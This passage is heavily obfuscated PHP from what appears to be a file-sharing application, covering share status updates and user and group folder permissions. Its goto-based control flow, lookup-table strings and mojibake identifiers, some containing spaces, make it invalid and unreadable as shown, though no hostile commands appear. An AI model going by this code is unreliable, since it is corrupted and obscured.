in_array($eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[719]], array($C›Ù‹•ƒ¶Ç[191], $C›Ù‹•ƒ¶Ç[87], $C›Ù‹•ƒ¶Ç[1852], $C›Ù‹•ƒ¶Ç[1853]))) { $bà²½î½æ[$C›Ù‹•ƒ¶Ç[719]] = $eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[719]]; } $fÌ½ÊÆğØ‹ = Input::get($C›Ù‹•ƒ¶Ç[445], $C›Ù‹•ƒ¶Ç[7], $C›Ù‹•ƒ¶Ç[1851], array($C›Ù‹•ƒ¶Ç[1775], $C›Ù‹•ƒ¶Ç[439])); goto f–ä°Û ¥; cŒ¯‡¤ñˆ: $C›Ù‹•ƒ¶Ç =& $_SERVER[«¾°Ã¤]; $bà²½î½æ = array(); if ($eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[730]]) { $AÛÜêÅÜÉá = $eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[485]] ? $eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[485]] : strtotime(date($C›Ù‹•ƒ¶Ç[1849])); $bà²½î½æ[$C›Ù‹•ƒ¶Ç[194]] = array($C›Ù‹•ƒ¶Ç[331], array($eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[730]], $AÛÜêÅÜÉá)); } goto bÏ´¢Å˜Ò; AİÏ¶©ƒ©ø: } public function reportStatus($f˜§Ñ‹ôê¤) { goto dß†‘Ğó; a‘šÊòîŒ‚: if (!$aÚæê–±äÜ) { return !1; } $FÆ»¤¦£ = array($EÂ¤îµï¼[719] => $f˜§Ñ‹ôê¤[$EÂ¤îµï¼[719]]); if ($f˜§Ñ‹ôê¤[$EÂ¤îµï¼[719]] == $EÂ¤îµï¼[1853] && $aÚæê–±äÜ[$EÂ¤îµï¼[719]] == $EÂ¤îµï¼[1853]) { $FÆ»¤¦£[$EÂ¤îµï¼[719]] = 0; } goto A°ªå™Ÿ¨¶; dß†‘Ğó: $EÂ¤îµï¼ =& $_SERVER[«¾°Ã¤]; $Bíğ„ë…‰ = array($EÂ¤îµï¼[393] => $f˜§Ñ‹ôê¤[$EÂ¤îµï¼[393]]); $aÚæê–±äÜ = Model($EÂ¤îµï¼[1847])->where($Bíğ„ë…‰)->field($EÂ¤îµï¼[1857])->find(); goto a‘šÊòîŒ‚; A°ªå™Ÿ¨¶: $aÍî‘à““Ì = Model($EÂ¤îµï¼[1847])->where($Bíğ„ë…‰)->save($FÆ»¤¦£); if ($f˜§Ñ‹ôê¤[$EÂ¤îµï¼[719]] == $EÂ¤îµï¼[1852]) { if ($aÚæê–±äÜ[$EÂ¤îµï¼[456]] != $EÂ¤îµï¼[191] && $this->shareFileMeta($aÚæê–±äÜ[$EÂ¤îµï¼[456]])) { $this->shareFileMeta($aÚæê–±äÜ[$EÂ¤îµï¼[456]], 0); } $this->remove($aÚæê–±äÜ[$EÂ¤îµï¼[477]]); return !0; } if ($aÍî‘à““Ì && $f˜§Ñ‹ôê¤[$EÂ¤îµï¼[719]] == $EÂ¤îµï¼[1853]) { $fï¸›·ñÕÍ = $FÆ»¤¦£[$EÂ¤îµï¼[719]] == $EÂ¤îµï¼[1853] ? 1 : 0; $this->shareFileMeta($aÚæê–±äÜ[$EÂ¤îµï¼[456]], $fï¸›·ñÕÍ); $this->removeByFile($aÚæê–±äÜ[$EÂ¤îµï¼[456]]); } goto bŞ¬Ùâ°®Ÿ; bŞ¬Ùâ°®Ÿ: return $aÍî‘à““Ì; goto BÔ¹™°Ìá³; BÔ¹™°Ìá³: } private function removeByFile($Fæ…¨ñØ—) { goto FòìÀ…ÓÁİ; CÇÓ¸ˆÅ¡: $c½À™“Àáé = array_to_keyvalue($bˆàÀà÷æŠ, $E…õ„–×ƒ¯[33], $E…õ„–×ƒ¯[477]); $this->remove($c½À™“Àáé); goto aŸóË…ÔÛ; FòìÀ…ÓÁİ: $E…õ„–×ƒ¯ =& $_SERVER[«¾°Ã¤]; $bˆàÀà÷æŠ = Model($E…õ„–×ƒ¯[799])->where(array($E…õ„–×ƒ¯[456] => $Fæ…¨ñØ—))->field($E…õ„–×ƒ¯[404])->select(); $b™¸Ô¢ŠÈÂ = array_to_keyvalue($bˆàÀà÷æŠ, $E…õ„–×ƒ¯[33], $E…õ„–×ƒ¯[404]); goto Aã ¦Ù¸çÙ; Aã ¦Ù¸çÙ: $BÁÙâ²–¦ = array($E…õ„–×ƒ¯[404] => array($E…õ„–×ƒ¯[7], $b™¸Ô¢ŠÈÂ), $E…õ„–×ƒ¯[482] => 1); $bˆàÀà÷æŠ = $this->where($BÁÙâ²–¦)->field($E…õ„–×ƒ¯[477])->select(); if (empty($bˆàÀà÷æŠ)) { return; } goto CÇÓ¸ˆÅ¡; aŸóË…ÔÛ: } private function shareFileMeta($FÆº—ÈëÁ, $c“£ÎÏ«ää = null) { $DÏÈÖÑğ¦ =& $_SERVER[«¾°Ã¤]; $Cæ¡‰„‹ŸÜ = array($DÏÈÖÑğ¦[456] => $FÆº—ÈëÁ, $DÏÈÖÑğ¦[93] => $DÏÈÖÑğ¦[1858]); if (is_null($c“£ÎÏ«ää)) { return Model($DÏÈÖÑğ¦[1859])->where($Cæ¡‰„‹ŸÜ)->find(); } $Cæ¡‰„‹ŸÜ[$DÏÈÖÑğ¦[372]] = $c“£ÎÏ«ää; Model($DÏÈÖÑğ¦[1859])->add($Cæ¡‰„‹ŸÜ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\x63\145\x5f\x61\x75\164\150"; public function getAuth($D®õ¯¯†ù­) { goto bêÚÂßªë˜; bêÚÂßªë˜: $a¢’é¤·‰Ä =& $_SERVER[«¾°Ã¤]; $eò¾ÒÊßîã = $this->sourceAuthSelect($D®õ¯¯†ù­); $b†çÕÒ‘™ = array(); goto B»‹¯µ¤; B»‹¯µ¤: $aÆ‚µš¸» = array(); $D‡†££™´ = 2 << 25; foreach ($eò¾ÒÊßîã as $dßˆõ“ó¨) { goto CÇó¤­ˆ£—; a„Í‡˜­¶×: if ($dßˆõ“ó¨[$a¢’é¤·‰Ä[413]] == SourceModel::TYPE_USER && $dßˆõ“ó¨[$a¢’é¤·‰Ä[493]] == $a¢’é¤·‰Ä[191]) { $b¥—¡×à„ = 0; } $aÆ‚µš¸»[] = $BíÑà´ˆäÁ[$a¢’é¤·‰Ä[415]] + $b¥—¡×à„; goto f¾¨öåÀŠº; CÇó¤­ˆ£—: $BíÑà´ˆäÁ = Model($a¢’é¤·‰Ä[1860])->listData($dßˆõ“ó¨[$a¢’é¤·‰Ä[1788]]); if (!$BíÑà´ˆäÁ) { continue; } $b†çÕÒ‘™[] = $dßˆõ“ó¨; goto FéÂôÜ©áğ; FéÂôÜ©áğ: $b¥—¡×à„ = 0; if ($dßˆõ“ó¨[$a¢’é¤·‰Ä[413]] == SourceModel::TYPE_GROUP) { $b¥—¡×à„ = $D‡†££™´ * 2; } if ($dßˆõ“ó¨[$a¢’é¤·‰Ä[413]] == SourceModel::TYPE_USER) { $b¥—¡×à„ = $D‡†££™´; } goto a„Í‡˜­¶×; f¾¨öåÀŠº: } goto CæÉ“ğ–“; CæÉ“ğ–“: array_multisort($aÆ‚µš¸», SORT_DESC, $b†çÕÒ‘™); return $b†çÕÒ‘™; goto F’ÖÌ¼Ê´À; F’ÖÌ¼Ê´À: } public function sourceAuthSelect($Cø†¨ØÂ) { goto E›ò ëå¬„; b«ÒÅ¿ƒ·„: if (count($b„¤‚‹§¢) == count($Cø†¨ØÂ)) { return $bÆÉå›¼Ë„ ? $b„¤‚‹§¢[$Cø†¨ØÂ[0]] : $b„¤‚‹§¢; } $FÒØğŠ°Ñ = $E¡²˜ÃÏ™Ó[1861]; $Eˆ×¦å–‘‚ = array($E¡²˜ÃÏ™Ó[404] => array($E¡²˜ÃÏ™Ó[7], $Cø†¨ØÂ)); goto DÜ„»­„Ïë; CÃ¬˜Âã±ä: if ($bÆÉå›¼Ë„) { return $B»‚¤æãø; } return $FàÛÆçÕ…; goto B×µµ—æí; C›É±¨Ğ–º: if ($bÆÉå›¼Ë„) { $Cø†¨ØÂ = array($Cø†¨ØÂ); } $b„¤‚‹§¢ = array(); foreach ($Cø†¨ØÂ as $c·Œ§Õ‰) { if (isset($aÙŒ„ù‚Şé[$c·Œ§Õ‰])) { $b„¤‚‹§¢[$c·Œ§Õ‰] = $aÙŒ„ù‚Şé[$c·Œ§Õ‰]; } } goto b«ÒÅ¿ƒ·„; E›ò ëå¬„: $E¡²˜ÃÏ™Ó =& $_SERVER[«¾°Ã¤]; static $aÙŒ„ù‚Şé = array(); $bÆÉå›¼Ë„ = is_array($Cø†¨ØÂ) ? !1 : !0; goto C›É±¨Ğ–º; DÜ„»­„Ïë: $B»‚¤æãø = $this->field($FÒØğŠ°Ñ)->order($E¡²˜ÃÏ™Ó[393])->where($Eˆ×¦å–‘‚)->select(); $FàÛÆçÕ… = array_to_keyvalue_group($B»‚¤æãø, $E¡²˜ÃÏ™Ó[404]); foreach ($Cø†¨ØÂ as $c·Œ§Õ‰) { $aÙŒ„ù‚Şé[$c·Œ§Õ‰] = $FàÛÆçÕ…[$c·Œ§Õ‰] ? $FàÛÆçÕ…[$c·Œ§Õ‰] : array(); } goto CÃ¬˜Âã±ä; B×µµ—æí: } public function setAuth($b£ •Í¿°Ò, $Eª‡œšè·ó) { goto C‡Äö‡ÈÚ; EÑáÑ¿¾ƒ: if ($eÅ¢Ü‚ù×Ï[$f­½²¶ƒ¶[413]] != SourceModel::TYPE_GROUP) { return !1; } $FÃ©íŒ¬ˆ… = 1; $Fô¬ªÈÁŠƒ = $eÅ¢Ü‚ù×Ï[$f­½²¶ƒ¶[493]]; goto BéßÖŠ´÷‹; AÀº˜ŸÙÍÚ: foreach ($Eª‡œšè·ó as $Dãˆî¼ø) { if (!in_array($Dãˆî¼ø[$f­½²¶ƒ¶[413]], $a¥²Ä¿·Ü©)) { show_json(LNG($f­½²¶ƒ¶[1862]), !1); } if ($Fô¬ªÈÁŠƒ != $FÃ©íŒ¬ˆ…) { if ($Dãˆî¼ø[$f­½²¶ƒ¶[413]] == SourceModel::TYPE_GROUP) { } if ($Dãˆî¼ø[$f­½²¶ƒ¶[493]] != 0 && !in_array($Dãˆî¼ø[$f­½²¶ƒ¶[493]], $DŠŸ†¸ä)) { } } if ($Dãˆî¼ø[$f­½²¶ƒ¶[493]] == 0) { $Dãˆî¼ø[$f­½²¶ƒ¶[413]] = SourceModel::TYPE_USER; } $f“éË‚Ï¦[] = array($f­½²¶ƒ¶[404] => $b£ •Í¿°Ò, $f­½²¶ƒ¶[413] => intval($Dãˆî¼ø[$f­½²¶ƒ¶[413]]), $f­½²¶ƒ¶[493] => intval($Dãˆî¼ø[$f­½²¶ƒ¶[493]]), $f­½²¶ƒ¶[1788] => intval($Dãˆî¼ø[$f­½²¶ƒ¶[1788]]) ? intval($Dãˆî¼ø[$f­½²¶ƒ¶[1788]]) : 0, $f­½²¶ƒ¶[1842] => intval($Dãˆî¼ø[$f­½²¶ƒ¶[1842]]) ? intval($Dãˆî¼ø[$f­½²¶ƒ¶[1842]]) : -1); } $this->where(array($f­½²¶ƒ¶[419] => $b£ •Í¿°Ò))->delete(); $this->addAll($f“éË‚Ï¦); goto bÉÁçÖ™˜; BéßÖŠ´÷‹: if ($Fô¬ªÈÁŠƒ != $FÃ©íŒ¬ˆ…) { $e÷ÏÅùĞ¶’ = array($f­½²¶ƒ¶[1693] => $Fô¬ªÈÁŠƒ); $DŠŸ†¸ä = Model($f­½²¶ƒ¶[1774])->field($f­½²¶ƒ¶[1529])->where($e÷ÏÅùĞ¶’)->select(); $DŠŸ†¸ä = array_to_keyvalue($DŠŸ†¸ä, $f­½²¶ƒ¶[33], $f­½²¶ƒ¶[1529]); } $a¥²Ä¿·Ü© = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $f“éË‚Ï¦ = array(); goto AÀº˜ŸÙÍÚ; C‡Äö‡ÈÚ: $f­½²¶ƒ¶ =& $_SERVER[«¾°Ã¤]; $eÅ¢Ü‚ù×Ï = Model($f­½²¶ƒ¶[1207])->sourceInfo($b£ •Í¿°Ò); if (!$eÅ¢Ü‚ù×Ï) { return !1; } goto EÑáÑ¿¾ƒ; bÉÁçÖ™˜: return !0; goto d½„Ù¼â ; d½„Ù¼â : } public function authClear($cÚ‚ˆ¦Î) { $D“é®·Ş£™ =& $_SERVER[«¾°Ã¤]; $Dù†˜‘– Ä = Model($D“é®·Ş£™[1207])->sourceInfo($cÚ‚ˆ¦Î); $Bßœ¤†öé = array($cÚ‚ˆ¦Î); if ($Dù†˜‘– Ä[$D“é®·Ş£™[412]] == $D“é®·Ş£™[87]) { $aĞÆ´Ã¤ = array($D“é®·Ş£™[562] => array($D“é®·Ş£™[521], $Dù†˜‘– Ä[$D“é®·Ş£™[496]] . $cÚ‚ˆ¦Î . $D“é®·Ş£™[522])); $Bßœ¤†öé = Model($D“é®·Ş£™[1207])->field($D“é®·Ş£™[419])->where($aĞÆ´Ã¤)->getField($D“é®·Ş£™[404], !0); $Bßœ¤†öé[] = $cÚ‚ˆ¦Î; } $this->where(array($D“é®·Ş£™[419] => array($D“é®·Ş£™[420], $Bßœ¤†öé)))->delete(); return !0; } public function getAllChildren($bÕé…ŠË«ˆ) { goto b¤¤—ÄÆ‘»; b¤¤—ÄÆ‘»: $F„‹Ø¼Ûƒ =& $_SERVER[«¾°Ã¤]; $B©¶æÔ‘Ñê = Model($F„‹Ø¼Ûƒ[1207])->sourceInfo($bÕé…ŠË«ˆ); if ($B©¶æÔ‘Ñê[$F„‹Ø¼Ûƒ[412]] != $F„‹Ø¼Ûƒ[87]) { return $this->sourceListAuth(array($bÕé…ŠË«ˆ)); } goto AßìŠ³¥³Ñ; Fî„à›à«¤: if (!$bê¾¤î¿) { return array(); } $C®™Í„ÇÑ’ = $F„‹Ø¼Ûƒ[1863]; $b£ëçÛ…Ûé = array($F„‹Ø¼Ûƒ[404] => array($F„‹Ø¼Ûƒ[7], $bê¾¤î¿), $F„‹Ø¼Ûƒ[432] => $F„‹Ø¼Ûƒ[191]); goto d­ƒÚ¶¡’; C„³¢ÉÖ™Å: return $this->sourceListAuth($c¥áÓ³ÅÒÕ); goto AÄ×´–¬‡š; E†á¥Òµ«: if ($B©¶æÔ‘Ñê[$F„‹Ø¼Ûƒ[487]] == $F„‹Ø¼Ûƒ[191] && $B©¶æÔ‘Ñê[$F„‹Ø¼Ûƒ[493]] != $eƒË¡ÎŒß”) { $dØö’Ä£º = $this->groupChidldAllRootSource($B©¶æÔ‘Ñê[$F„‹Ø¼Ûƒ[493]]); } $bê¾¤î¿ = $this->field($F„‹Ø¼Ûƒ[404])->group($F„‹Ø¼Ûƒ[404])->select(); $bê¾¤î¿ = array_to_keyvalue($bê¾¤î¿, $F„‹Ø¼Ûƒ[33], $F„‹Ø¼Ûƒ[404]); goto Fî„à›à«¤; AßìŠ³¥³Ñ: if ($B©¶æÔ‘Ñê[$F„‹Ø¼Ûƒ[413]] != SourceModel::TYPE_GROUP) { return array(); } $eƒË¡ÎŒß” = 1; $dØö’Ä£º = array($bÕé…ŠË«ˆ); goto E†á¥Òµ«; d­ƒÚ¶¡’: $b¯ñßŞùÎƒ = Model($F„‹Ø¼Ûƒ[799])->field($C®™Í„ÇÑ’)->where($b£ëçÛ…Ûé)->select(); $c¥áÓ³ÅÒÕ = array($bÕé…ŠË«ˆ); foreach ($b¯ñßŞùÎƒ as $fƒÙò³­±›) { foreach ($dØö’Ä£º as $c°Ó›İÇ‹‹) { $cƒøí—™ = $F„‹Ø¼Ûƒ[47] . $c°Ó›İÇ‹‹ . $F„‹Ø¼Ûƒ[47]; $a¤âÔ¦ó‡‘ = $fƒÙò³­±›[$F„‹Ø¼Ûƒ[496]] . $fƒÙò³­±›[$F„‹Ø¼Ûƒ[404]] . $F„‹Ø¼Ûƒ[47]; if (strstr($a¤âÔ¦ó‡‘, $cƒøí—™)) { $c¥áÓ³ÅÒÕ[] = $fƒÙò³­±›[$F„‹Ø¼Ûƒ[404]]; break; } } } goto C„³¢ÉÖ™Å; AÄ×´–¬‡š: } private function sourceListAuth($a¿ÛÆÅÂÙÜ) { goto B¶ÎÃä˜áÀ; B¶ÎÃä˜áÀ: $BŒÜšŞïï =& $_SERVER[«¾°Ã¤]; $A«ÛöÃŠÁ = Model($BŒÜšŞïï[1207])->sourceListInfo($a¿ÛÆÅÂÙÜ, !0); $b¹ ¤İ¥’ = $this->sourceAuthSelect($a¿ÛÆÅÂÙÜ); goto Fí¶ë¯Á§; Fí¶ë¯Á§: $a§®Á‚ºˆ÷ = array(); $eÎø¿İÒ¹Ñ = array(); foreach ($A«ÛöÃŠÁ as $d„”×Ù’Š°) { goto F©å‚¸±‰À; c„ÊÑÙ’¤Ş: $e’»Ó‡ºè = count(explode($BŒÜšŞïï[8], trim($d„”×Ù’Š°[$BŒÜšŞïï[504]], $BŒÜšŞïï[8]))); $eÎø¿İÒ¹Ñ[] = $e’»Ó‡ºè + ($d„”×Ù’Š°[$BŒÜšŞïï[29]] == $BŒÜšŞïï[77] ? 0 : 1000); goto a‹Éí¡Æ£; d‰´Íâã•: unset($d„”×Ù’Š°[$BŒÜšŞïï[85]]); $aŸ’×¦§ŒŒ = $b¹ ¤İ¥’[$d„”×Ù’Š°[$BŒÜšŞïï[404]]]; if (!$aŸ’×¦§ŒŒ) { continue; } goto aÑ‡íĞ®ºî; F©å‚¸±‰À: unset($d„”×Ù’Š°[$BŒÜšŞïï[443]]); unset($d„”×Ù’Š°[$BŒÜšŞïï[441]]); unset($d„”×Ù’Š°[$BŒÜšŞïï[415]]); goto d‰´Íâã•; aÑ‡íĞ®ºî: $d„”×Ù’Š°[$BŒÜšŞïï[1864]] = $this->authTargetInfo($aŸ’×¦§ŒŒ); $d„”×Ù’Š°[$BŒÜšŞïï[504]] = rtrim($d„”×Ù’Š°[$BŒÜšŞïï[499]], $BŒÜšŞïï[8]) . $BŒÜšŞïï[8] . ltrim($d„”×Ù’Š°[$BŒÜšŞïï[504]], $BŒÜšŞïï[8]); $a§®Á‚ºˆ÷[] = $d„”×Ù’Š°; goto c„ÊÑÙ’¤Ş; a‹Éí¡Æ£: } goto FßöÛÈÆ—ß; FßöÛÈÆ—ß: array_multisort($eÎø¿İÒ¹Ñ, SORT_ASC, $a§®Á‚ºˆ÷); return $a§®Á‚ºˆ÷; goto EµÄ¯‘Úç”; EµÄ¯‘Úç”: } private function groupChidldAllRootSource($BŒÎš”Ï…) { $fâ«íë˜ˆ¨ =& $_SERVER[«¾°Ã¤]; $føäºÁõä£ = Model($fâ«íë˜ˆ¨[1865])->groupChildrenAll($BŒÎš”Ï…); $Eóáš¢±† = array($fâ«íë˜ˆ¨[487] => 0, $fâ«íë˜ˆ¨[493] => array($fâ«íë˜ˆ¨[7], $føäºÁõä£), $fâ«íë˜ˆ¨[413] => SourceModel::TYPE_GROUP); $b³Æ³”‚ŞÆ = Model($fâ«íë˜ˆ¨[799])->field($fâ«íë˜ˆ¨[404])->where($Eóáš¢±†)->select(); $b³Æ³”‚ŞÆ = array_to_keyvalue($b³Æ³”‚ŞÆ, $fâ«íë˜ˆ¨[33], $fâ«íë˜ˆ¨[404]); return $b³Æ³”‚ŞÆ; } private function authTargetInfo($eŠâÊä•À) { goto f‡²ÔìÚ…¶; f‡²ÔìÚ…¶: $eƒëÇ–õ‹ =& $_SERVER[«¾°Ã¤]; $AˆÁ¬‹ù = array(); $D‘¬±×â¦ˆ = array(); goto AñÖÚ†¦¯; CšÄ¶Ï“ï: return $AˆÁ¬‹ù; goto eß¿ËÚ“; AñÖÚ†¦¯: $E¾×´†ÄÕë = 2 << 25; foreach ($eŠâÊä•À as $Aè¯¦ºì¼ò) { goto Fˆ¦ß‰“¬; fç”áµÙ×Ü: if ($Aè¯¦ºì¼ò[$eƒëÇ–õ‹[413]] == SourceModel::TYPE_USER && $Aè¯¦ºì¼ò[$eƒëÇ–õ‹[493]] == $eƒëÇ–õ‹[191]) { $A¶Í°Òâ = 0; } $D‘¬±×â¦ˆ[] = $Aƒ–È·çË³[$eƒëÇ–õ‹[415]] + $A¶Í°Òâ; goto E¤¬‚ï¦Š; Fˆ¦ß‰“¬: $Aƒ–È·çË³ = Model($eƒëÇ–õ‹[1860])->listData($Aè¯¦ºì¼ò[$eƒëÇ–õ‹[1788]]); if (!$Aƒ–È·çË³) { continue; } if ($Aè¯¦ºì¼ò[$eƒëÇ–õ‹[413]] == SourceModel::TYPE_USER) { $cØ•ÕÕ×†ƒ = Model($eƒëÇ–õ‹[511])->getInfoSimpleOuter($Aè¯¦ºì¼ò[$eƒëÇ–õ‹[493]]); if ($cØ•ÕÕ×†ƒ[$eƒëÇ–õ‹[1529]] == $eƒëÇ–õ‹[1086]) { continue; } if ($cØ•ÕÕ×†ƒ[$eƒëÇ–õ‹[1529]] == $eƒëÇ–õ‹[191]) { $cØ•ÕÕ×†ƒ[$eƒëÇ–õ‹[28]] = LNG($eƒëÇ–õ‹[1866]); } } else { $cØ•ÕÕ×†ƒ = Model($eƒëÇ–õ‹[495])->getInfoSimple($Aè¯¦ºì¼ò[$eƒëÇ–õ‹[493]]); } goto CßÒÜÒ§êß; AŞÕÏ¸µà: $A¶Í°Òâ = 0; if ($Aè¯¦ºì¼ò[$eƒëÇ–õ‹[413]] == SourceModel::TYPE_GROUP) { $A¶Í°Òâ = $E¾×´†ÄÕë * 2; } if ($Aè¯¦ºì¼ò[$eƒëÇ–õ‹[413]] == SourceModel::TYPE_USER) { $A¶Í°Òâ = $E¾×´†ÄÕë; } goto fç”áµÙ×Ü; CßÒÜÒ§êß: if (!$cØ•ÕÕ×†ƒ) { continue; } $cØ•ÕÕ×†ƒ[$eƒëÇ–õ‹[455]] = $Aƒ–È·çË³; $AˆÁ¬‹ù[] = $cØ•ÕÕ×†ƒ; goto AŞÕÏ¸µà; E¤¬‚ï¦Š: } array_multisort($D‘¬±×â¦ˆ, SORT_DESC, $AˆÁ¬‹ù); goto CšÄ¶Ï“ï; eß¿ËÚ“: } public function getAllChildrenByUser($Aì×ÛôÉ¥, $a¨‹Œƒ¦Óİ) { goto bÕ­ğ¡º¢ø; a‘ó…¢ÌÍÂ: $F©¥ŒêÁÇ = Model($BŠ—ğ„©Üò[1207])->sourceInfo($Aì×ÛôÉ¥); $b²Ö³¸«ÛÔ = array(); $AÈºæ¥×°¦ = 1; goto dÀİ•¦ÛÖ’; dÀİ•¦ÛÖ’: if ($F©¥ŒêÁÇ[$BŠ—ğ„©Üò[487]] == $BŠ—ğ„©Üò[191] && $F©¥ŒêÁÇ[$BŠ—ğ„©Üò[493]] != $AÈºæ¥×°¦ && $this->groupContainUser($F©¥ŒêÁÇ[$BŠ—ğ„©Üò[493]], $a¨‹Œƒ¦Óİ)) { foreach ($fŒŠ‚Ó¾Ø[$BŠ—ğ„©Üò[1867]] as $bŞª„Ä) { $Fê”×«½æŠ = Model($BŠ—ğ„©Üò[495])->getInfo($bŞª„Ä[$BŠ—ğ„©Üò[1693]]); $Fë‘æ±Ğ× = Model($BŠ—ğ„©Üò[515])->getInfoSimpleOuter($a¨‹Œƒ¦Óİ); $Fë‘æ±Ğ×[$BŠ—ğ„©Üò[455]] = $bŞª„Ä[$BŠ—ğ„©Üò[415]]; if (Model($BŠ—ğ„©Üò[1860])->authCheckAction($bŞª„Ä[$BŠ—ğ„©Üò[415]][$BŠ—ğ„©Üò[415]], $BŠ—ğ„©Üò[1713])) { continue; } $e¤ìí²åÀô = array($BŠ—ğ„©Üò[28] => $BŠ—ğ„©Üò[1482] . $Fê”×«½æŠ[$BŠ—ğ„©Üò[28]], $BŠ—ğ„©Üò[404] => $Fê”×«½æŠ[$BŠ—ğ„©Üò[85]][$BŠ—ğ„©Üò[404]], $BŠ—ğ„©Üò[76] => KodIO::make($Fê”×«½æŠ[$BŠ—ğ„©Üò[85]][$BŠ—ğ„©Üò[404]]), $BŠ—ğ„©Üò[487] => $BŠ—ğ„©Üò[191], $BŠ—ğ„©Üò[413] => $BŠ—ğ„©Üò[1016], $BŠ—ğ„©Üò[29] => $BŠ—ğ„©Üò[526], $BŠ—ğ„©Üò[504] => $Fê”×«½æŠ[$BŠ—ğ„©Üò[500]], $BŠ—ğ„©Üò[1693] => $Fê”×«½æŠ[$BŠ—ğ„©Üò[1693]], $BŠ—ğ„©Üò[497] => $Fê”×«½æŠ[$BŠ—ğ„©Üò[487]], $BŠ—ğ„©Üò[1864] => array($Fë‘æ±Ğ×)); $b²Ö³¸«ÛÔ[$e¤ìí²åÀô[$BŠ—ğ„©Üò[404]]] = $e¤ìí²åÀô; } } $f¯ÜÍ„„ÕÇ = array(); $CôÏß‡¬‚§ = $this->getAllChildren($Aì×ÛôÉ¥); goto BÙÁÂÜĞ¿Ö; BÙÁÂÜĞ¿Ö: foreach ($CôÏß‡¬‚§ as $C¦å¼ŸéíÔ) { $Fì˜³åÂÄ = !1; foreach ($C¦å¼ŸéíÔ[$BŠ—ğ„©Üò[1864]] as $bìÁ´ÄóŠğ) { if ($bìÁ´ÄóŠğ[$BŠ—ğ„©Üò[1529]]) { if ($bìÁ´ÄóŠğ[$BŠ—ğ„©Üò[1529]] == $a¨‹Œƒ¦Óİ) { $Fì˜³åÂÄ = !0; break; } } if ($bìÁ´ÄóŠğ[$BŠ—ğ„©Üò[1693]]) { if ($this->groupContainUser($bìÁ´ÄóŠğ[$BŠ—ğ„©Üò[1693]], $a¨‹Œƒ¦Óİ)) { $Fì˜³åÂÄ = !0; break; } } } if ($Fì˜³åÂÄ) { $f¯ÜÍ„„ÕÇ[] = $C¦å¼ŸéíÔ; } $D‹‹èÙØ„ = $C¦å¼ŸéíÔ[$BŠ—ğ„©Üò[404]]; if (isset($b²Ö³¸«ÛÔ[$D‹‹èÙØ„])) { $C¦å¼ŸéíÔ[$BŠ—ğ„©Üò[1864]][] = $b²Ö³¸«ÛÔ[$D‹‹èÙØ„][0]; $b²Ö³¸«ÛÔ[$D‹‹èÙØ„] = !1; } } $b²Ö³¸«ÛÔ = array_filter(array_values($b²Ö³¸«ÛÔ)); $f¯ÜÍ„„ÕÇ = array_merge($b²Ö³¸«ÛÔ, $f¯ÜÍ„„ÕÇ); goto Cª›²ÂÆÑÄ; bÕ­ğ¡º¢ø: $BŠ—ğ„©Üò =& $_SERVER[«¾°Ã¤]; $fŒŠ‚Ó¾Ø = Model($BŠ—ğ„©Üò[515])->getInfo($a¨‹Œƒ¦Óİ); if (!$a¨‹Œƒ¦Óİ || !$Aì×ÛôÉ¥ || !$fŒŠ‚Ó¾Ø) { return array(); } goto a‘ó…¢ÌÍÂ; Cª›²ÂÆÑÄ: return $f¯ÜÍ„„ÕÇ; goto bîĞ‡§ªÍ¸; bîĞ‡§ªÍ¸: } public function setAllChildrenByUser($Fƒ½ğÛ…“ñ, $cïŞêğÈÛÌ, $F ¨óí¤È) { $C˜©Åïø ‰ =& $_SERVER[«¾°Ã¤]; $còÑä‚çÎ = $this->getAllChildrenByUser($Fƒ½ğÛ…“ñ, $cïŞêğÈÛÌ); if (!$F ¨óí¤È || !$còÑä‚çÎ) { return !1; } foreach ($còÑä‚çÎ as $b¯Á÷İÓ½ä) { $F«¯ÁˆÉÙ = array(); foreach ($b¯Á÷İÓ½ä[$C˜©Åïø ‰[1864]] as $fÈŒë„ˆŞÉ) { $dª‡â¿ = $fÈŒë„ˆŞÉ[$C˜©Åïø ‰[455]]; $DªÙ„Œà£ƒ = $fÈŒë„ˆŞÉ[$C˜©Åïø ‰[1529]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $c˜Ø¿œğè = $fÈŒë„ˆŞÉ[$C˜©Åïø ‰[1529]] ? $fÈŒë„ˆŞÉ[$C˜©Åïø ‰[1529]] : $fÈŒë„ˆŞÉ[$C˜©Åïø ‰[1693]]; if ($fÈŒë„ˆŞÉ[$C˜©Åïø ‰[1529]] && $fÈŒë„ˆŞÉ[$C˜©Åïø ‰[1529]] == $cïŞêğÈÛÌ) { continue; } $F«¯ÁˆÉÙ[] = array($C˜©Åïø ‰[404] => $b¯Á÷İÓ½ä[$C˜©Åïø ‰[404]], $C˜©Åïø ‰[413] => $DªÙ„Œà£ƒ, $C˜©Åïø ‰[493] => intval($c˜Ø¿œğè), $C˜©Åïø ‰[1788] => isset($dª‡â¿[$C˜©Åïø ‰[393]]) ? intval($dª‡â¿[$C˜©Åïø ‰[393]]) : 0, $C˜©Åïø ‰[1842] => isset($dª‡â¿[$C˜©Åïø ‰[1842]]) ? intval($dª‡â¿[$C˜©Åïø ‰[1842]]) : -1); } $F«¯ÁˆÉÙ[] = array($C˜©Åïø ‰[404] => $b¯Á÷İÓ½ä[$C˜©Åïø ‰[404]], $C˜©Åïø ‰[413] => SourceModel::TYPE_USER, $C˜©Åïø ‰[493] => intval($cïŞêğÈÛÌ), $C˜©Åïø ‰[1788] => intval($F ¨óí¤È), $C˜©Åïø ‰[1842] => -1); $this->where(array($C˜©Åïø ‰[419] => $b¯Á÷İÓ½ä[$C˜©Åïø ‰[404]]))->delete(); $this->addAll($F«¯ÁˆÉÙ); } return !0; } public function get($fËÕ“Áƒ‚‚) { $C£äÇ„¼• = $this->getSourceList(array($fËÕ“Áƒ‚‚), !0); return $C£äÇ„¼•[0]; } public function getSourceList($e‹ÖØŞÏÆ£, $b×æ„‡ãó÷ = false, $F„İÏÎÓÚé = false) { goto d×Ü¢ÂÑ; FøÄğèœº–: foreach ($b×æ„‡ãó÷ as $BéÃÇ¢¿íÁ => $E—ïÚÃÑš¾) { $e¬—Ğ´ï¢Ì = 